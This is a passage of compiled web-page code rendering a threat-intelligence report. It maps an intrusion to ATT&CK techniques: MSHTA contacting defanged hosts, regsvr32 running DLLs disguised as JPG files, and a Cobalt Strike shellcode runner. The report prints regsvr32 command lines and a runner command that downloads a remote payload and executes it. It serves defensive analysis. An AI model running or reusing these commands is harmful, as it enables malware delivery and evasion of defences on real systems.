Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"MSHTA")," connected to public server via HTTP."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"45[.]144.29.211"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"wilkinstransportss[.]com"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"80[.]92.206.122"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"steptransport2017b[.]com"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"MSHTA")," created ",(0,l.kt)("em",{parentName:"td"},".JPG")," file at Users","\\","Public folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"c:\\\\users\\\\public\\\\brDefine.jpg"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"c:\\\\users\\\\public\\\\uGirl.jpg"))))),(0,l.kt)("h4",{id:"notes-1"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"those jpg files are DLL.")),(0,l.kt)("h3",{id:"threat-actor-used-regsvr32-to-launch-payload-for-defense-evasion"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"REGSVR32")," to launch payload for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-3"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-3"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1218.010 - Signed Binary Proxy Execution: Regsvr32"),(0,l.kt)("li",{parentName:"ul"},"T1036 - Masquerading"),(0,l.kt)("li",{parentName:"ul"},"T1218.005 - Signed Binary Proxy Execution: Mshta"),(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer")),(0,l.kt)("h4",{id:"behaviors-and-observables-3"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010",(0,l.kt)("br",null),"T1036",(0,l.kt)("br",null),"T1218.005",(0,l.kt)("br",null),"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"MSHTA spawned REGSVR32 to execute a ",(0,l.kt)("em",{parentName:"td"},".JPG")," file from Users","\\","Public folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\regsvr32.exe" c:\\\\users\\\\public\\\\brDefine.jpg'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\regsvr32.exe" c:\\\\users\\\\public\\\\uGirl.jpg'))))),(0,l.kt)("h4",{id:"notes-2"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"JPG files are actually DLL files.")),(0,l.kt)("h3",{id:"threat-actor-used-regsvr32-to-download-a-masqueraded-cobalt-strike-shellcode-runner-for-command-and-control"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"REGSVR32")," to download a masqueraded ",(0,l.kt)("em",{parentName:"h3"},"Cobalt Strike shellcode runner")," for Command And Control."),(0,l.kt)("h4",{id:"tactic-4"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-4"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1218.010 - Signed Binary Proxy Execution: Regsvr32"),(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer")),(0,l.kt)("h4",{id:"behaviors-and-observables-4"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010",(0,l.kt)("br",null),"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"REGSVR32 drops file (shellcode runner)"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\jyheeckptwa.exe"))))),(0,l.kt)("h3",{id:"threat-actor-used-cobalt-strike-shellcode-runner-to-execute-a-remote-payload-for-command-and-control"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"Cobalt Strike shellcode runner")," to execute a remote payload for Command And Control."),(0,l.kt)("h4",{id:"tactic-5"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-5"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols"),(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer")),(0,l.kt)("h4",{id:"behaviors-and-observables-5"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Shellcode runner connected to public server"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"89.163.140[.]101"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1105",(0,l.kt)("br",null),"T1071.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Shellcode runner executed web payload (Cobalt Strike shellcode)"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"jyheeckptwa.exe -u http://89[.]163.140.101:8000/download/abc.bin -t 1"))))),(0,l.kt)("h4",{id:"notes-3"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"This shell code runner seems a variation or developed upon ",(0,l.kt)("em",{parentName:"li"},"Gopurple.exe")),(0,l.kt)("li",{parentName:"ul"},"the payload is likely a CobaltStrike payload.")))}c.isMDXComponent=!0}}]);